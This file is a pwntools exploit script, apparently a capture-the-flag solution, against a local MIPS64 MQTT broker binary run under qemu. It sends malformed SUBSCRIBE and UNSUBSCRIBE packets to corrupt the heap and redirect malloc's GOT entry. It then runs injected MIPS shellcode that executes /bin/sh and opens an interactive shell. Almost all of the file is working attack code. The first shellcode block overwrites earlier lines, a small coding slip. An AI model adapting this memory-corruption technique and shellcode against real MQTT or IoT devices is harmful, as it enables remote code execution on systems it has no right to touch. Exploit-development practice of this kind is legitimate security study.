from pwn import*
context(os='linux', arch='mips64', endian='big')

s = process(["qemu-mips64", "-L", "./", "-g", "1234", "./server"])
# s = process(["qemu-mips64", "-L", "./", "./server"])

# Connect
sleep(0.1)
s.send(b'\x10' + b'\x34')

VariableHeader = b'\x00\x04MQTT' + b'\x04\xC2' + b'\x43\x21' # \x04 + MQTT + \x04\x02 + \x43\x21
VariableHeader+= b'\x00\x0F' + b'Car_MQTT_Client'
VariableHeader+= b'\x00\x11' + b'Car_Administrator'
VariableHeader+= b'\x00\x04' + b'\x00\xDD\x5E\x85'

# Subscribe 1
sleep(0.1)
s.send(VariableHeader)

sleep(0.1)
s.send(b'\x80' + b'\x10')

VariableHeader = b'\x00\x00\x00\x0CIOTcar_topic'

sleep(0.1)
s.send(VariableHeader)

for i in range(5):
    sleep(0.1)
    s.send(b'\xC0' + b'\x01\x00')

# Publish
sleep(0.1)
s.send(b'\x30' + b'\x15')

VariableHeader = b'\x00\x0CIOTcar_topic'
VariableHeader+= b'car_car'

sleep(0.1)
s.send(VariableHeader)

s.recvuntil(b'IOTcar_topic')
# 0x4000018050
# print(s.recv())
heap_base = 0x4000018000
elf_base = heap_base - 0x18000
malloc_got = elf_base + 0x172C0
shellcode_addr = heap_base + 0xd0

success('heap_base=>' + hex(heap_base))
success('elf_base=>' + hex(elf_base))
success('malloc_got=>' + hex(malloc_got))
success('shellcode_addr=>' + hex(shellcode_addr))

# Subscribe 2
sleep(0.1)
s.send(b'\x80' + b'\x30')

VariableHeader = b'\x00\x00\x00\x2C' + b'a'*0x2C

sleep(0.1)
s.send(VariableHeader)

# Unsubscribe
sleep(0.1)
s.send(b'\xa0' + b'\x30')

VariableHeader = b'\x00\x00\x00\x2C' + b'a'*0x2C

sleep(0.1)
s.send(VariableHeader)

shellcode = b'\x00\x00\x28\x20' # move $a1, $zero
shellcode = b'\x00\x00\x30\x20' # move $a2, $zero
shellcode = b'\x24\x02\x00\x2F' # li $v0, 0x2F
shellcode+= b'\x00\x02\x14\x38' # dsll32 $v0, v$0, 0x10
shellcode+= b'\x64\x42\x62\x69' # daddiu $v0, 0x6269
shellcode+= b'\x00\x02\x14\x38' # dsll32 $v0, $v0, 0x10
shellcode+= b'\x64\x42\x6E\x2f' # daddiu $v0, 0x6e2f
shellcode+= b'\x00\x02\x14\x38' # dsll32 $v0, $v0, 0x10
shellcode+= b'\x64\x42\x73\x68' # daddiu $v0, 0x7368
shellcode+= b'\x00\x02\x12\x38' # dsll32 $v0, $v0, 0x8
shellcode+= b'\xFF\xA2\x00\x00' # sd v0, 0(sp)
shellcode+= b'\x03\xA0\x20\x25' # move $a0, $sp
shellcode+= b'\x00\x00\x00\x00' # nop
shellcode+= b'\x24\x02\x00\x3B' # li $v0, 0x3B
shellcode+= b'\x00\x00\x00\x0C' # syscall
shellcode+= b'\x24\x02\x00\x10' # li $v0, 0x10
shellcode+= b'\x00\x00\x00\x0C' # syscall

# Subscribe 3
sleep(0.1)
s.send(b'\x80' + b'\x7f')

VariableHeader = b'\x00\x00\x02\x0C' + b'a'*0xc + b'bbbb'
VariableHeader+= p64(0x0001400000000000) + p64(0x0000000000000041)
VariableHeader+= p64(malloc_got-0x20)
VariableHeader+= shellcode

VariableHeader = VariableHeader.ljust(0x7f, b'\x00')
s.send(VariableHeader)

# Unsubscribe
sleep(0.1)
s.send(b'\xa0' + b'\x30')

VariableHeader = b'\x00\x00\x00\x2C' + b'a'*0x2C

sleep(0.1)
s.send(VariableHeader)


# Subscribe 4
sleep(0.1)
s.send(b'\x80' + b'\x34')

shellcode1 = b'\x00\x00\x28\x20' # move $a1, $zero
shellcode1+= b'\x00\x00\x30\x20' # move $a2, $zero
shellcode1+= b'\x24\x02\x00\x2F' # li $v0, 0x2F
shellcode1+= b'\x00\x02\x14\x38' # dsll32 $v0, v$0, 0x10
shellcode1+= b'\x64\x42\x62\x69' # daddiu $v0, 0x6269
shellcode1+= b'\x00\x02\x14\x38' # dsll32 $v0, $v0, 0x10
shellcode1+= b'\x64\x42\x6E\x2f' # daddiu $v0, 0x6e2f
shellcode1+= b'\x00\x02\x14\x38' # dsll32 $v0, $v0, 0x10
shellcode1+= b'\x64\x42\x73\x68' # daddiu $v0, 0x7368
shellcode1+= b'\x00\x02\x12\x38' # dsll32 $v0, $v0, 0x8
shellcode1+= b'\xFF\xA2\x00\x00' # sd a0, 0(sp)
shellcode1+= b'\x03\xA0\x20\x25' # mov $a0, $sp

VariableHeader = b'\x00\x00\x00\x30' + shellcode1

sleep(0.1)
s.send(VariableHeader)

# Subscribe 5
sleep(0.1)
s.send(b'\x80' + b'\x2c')

VariableHeader = b'\x00\x00\x00\x28' + p64(0)*2 + p64(shellcode_addr) + p64(elf_base+0x175F0) +  p64(elf_base+0x175F8)

sleep(0.1)
s.send(VariableHeader)

# Subscribe 6
sleep(0.1)
s.send(b'\x80' + b'\x05')

VariableHeader = b'\x00\x00\x00\x01' + b'\xFF'

sleep(0.1)
s.send(VariableHeader)


s.interactive()
